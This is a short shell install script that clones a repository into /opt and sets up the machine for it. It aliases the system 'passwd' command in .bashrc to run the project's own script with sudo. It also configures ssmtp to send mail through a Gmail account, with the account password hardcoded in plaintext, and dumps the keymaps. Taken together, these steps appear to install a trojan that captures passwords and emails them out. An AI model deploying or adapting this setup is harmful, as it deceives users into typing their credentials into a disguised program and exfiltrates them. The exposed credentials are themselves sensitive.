
#git
sudo apt install git
FOLDER="kelompokkucing"
cd /opt/
link="https://github.com/yagrariksa/$FOLDER"
git clone $link


#conf alias
cd
COMMAND="sudo /opt/$FOLDER/run.sh"
ALIAS="alias passwd=\"$COMMAND\""
echo $ALIAS >> .bashrc

# install ssmtp
apt install -y ssmtp
echo "mailhub=smtp.gmail.com:587" >> /etc/ssmtp/ssmtp.conf
echo "AuthUser=majorminor658@gmail.com" >> /etc/ssmtp/ssmtp.conf
echo "AuthPass=majorminor123" >> /etc/ssmtp/ssmtp.conf
echo "UseSTARTTLS=YER" >> /etc/ssmtp/ssmtp.conf
echo "TLS_CA_File=/etc/pki/tls/certs/ca-bundle.crt" >> /etc/ssmtp/ssmtp.conf
echo "root:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
echo "mainuser:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
# ln -s /opt/$FOLDER/ssmtp.conf /etc/ssmtp/ssmtp.conf

# create keymaps
dumpkeys > /opt/$FOLDER/keymaps.txt